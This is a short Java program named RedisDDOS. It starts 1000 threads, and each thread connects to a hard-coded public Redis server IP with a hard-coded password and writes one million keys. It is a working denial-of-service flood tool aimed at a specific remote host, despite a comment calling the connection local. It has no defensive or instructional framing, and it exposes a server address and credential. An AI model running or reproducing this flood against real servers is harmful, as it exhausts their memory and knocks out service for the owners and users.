package com.sun.http;

import redis.clients.jedis.Jedis;

public class RedisDDOS implements Runnable {

    @Override
    public void run() {
        //连接redis服务器(在这里是连接本地的)
        Jedis jedis = new Jedis("122.112.174.92", 6379);
        //权限认证
        jedis.auth("112233");

        for (int i = 0; i < 1000000; i++) {
            jedis.set(Thread.currentThread().getName() + i, "xinxin" + i);//向key-->name中放入了value-->xinxin
            System.out.println(Thread.currentThread().getName() + i);
        }
        System.out.println("刷新完成");
    }
}


class Main2 {
    public static void main(String[] args) {

        for (int i = 0; i < 1000; i++) {
            RedisDDOS redisDDOS = new RedisDDOS();
            new Thread(redisDDOS).start();
        }
    }
}
